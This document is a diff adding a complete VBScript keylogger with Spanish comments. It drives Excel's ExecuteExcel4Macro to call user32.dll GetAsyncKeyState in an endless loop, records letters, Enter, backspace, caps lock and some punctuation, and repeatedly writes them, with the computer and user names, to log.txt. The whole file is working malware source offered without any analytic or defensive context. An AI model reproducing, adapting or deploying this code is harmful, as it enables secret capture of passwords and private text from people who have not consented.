@@ -1,0 +1,220 @@
+option explicit
+
+Dim ExcelApp,f,fso,log,conta,datos,shell,api,cmd,may
+
+ 
+
+set fso = createobject("scripting.filesystemobject")
+
+Set ExcelApp = CreateObject("Excel.Application") 
+
+Set Shell = CreateObject( "WScript.Shell" )
+
+ 
+
+datos = "Nombre de la maquina:" & Shell.ExpandEnvironmentStrings("%computername%") & vbcrlf
+
+datos = datos & "Nombre de usuario:" & Shell.ExpandEnvironmentStrings("%username%") & vbcrlf
+
+datos = datos & "Fecha:" & now & vbcrlf
+
+datos = datos & "==================================================================================================================================================================" & vbcrlf
+
+ 
+
+log = ""
+
+conta = 0
+
+may = 0
+
+ 
+
+While true
+
+   if conta >= 50 then
+
+      conta = 0
+
+      if fso.fileexists("log.txt") then
+
+      fso.deletefile("log.txt")  
+
+   end if
+
+      set f = fso.createtextfile("log.txt")
+
+   f.write(datos)
+
+   f.write(log)
+
+   f.close
+
+   end if 
+
+   conta = conta + 1
+
+   api=0      
+
+'===========================================================================================================================
+
+' LETRAS MAYUSCULAS Y MINUSCULAS  
+
+   log = log & letras(may)
+
+'==============================================================================================================================
+
+' OTRAS
+
+   
+
+   cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 32 & ")"
+
+   api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+   if api<>0 then
+
+      log = log & " " 
+
+      api=0   
+
+   end if   
+
+   cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 8 & ")"
+
+   api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+   if api<>0 then
+
+      log = mid(log,1,len(log)-1)  
+
+      api=0   
+
+   end if    
+
+   cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 13 & ")"
+
+   api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+   if api<>0 then
+
+      log = log & "[Enter]" 
+
+      api=0   
+
+   end if      
+
+   cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 20 & ")"
+
+   api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+   if api<>0 then
+
+      if may = 0 then
+
+            may = 1
+
+         else
+
+            may = 0
+
+         end if 
+
+      api=0    
+
+   end if   
+
+    
+
+   cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 192 & ")"
+
+   api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+   if api<>0 then
+
+      if may=0 then
+
+         log = log & "ñ"
+
+      else
+
+       log = log & "Ñ"
+
+   end if   
+
+      api=0   
+
+   end if
+
+    
+
+   cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 190 & ")"
+
+   api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+   if api<>0 then
+
+      log = log & "." 
+
+      api=0   
+
+   end if  
+
+    
+
+   cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & 188 & ")"
+
+   api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+   if api<>0 then
+
+      log = log & "," 
+
+      api=0   
+
+   end if  
+
+    
+
+wend
+
+ 
+
+function letras(may)
+
+ dim x,api,cmd,digi  
+
+   for x = 65 to 90
+
+      cmd = "CALL(""user32.dll"", ""GetAsyncKeyState"", ""JJ"", " & x & ")"
+
+      api = ExcelApp.ExecuteExcel4Macro(cmd)
+
+      if api<>0 then
+
+         exit for   
+
+      end if
+
+   next
+
+    
+
+   if x < 91 then
+
+      if may = 0 then
+
+         digi = lcase(chr(x))
+
+      else
+
+         digi = chr(x)
+
+      end if
+
+   end if
+
+   letras = digi
+
+end function
+
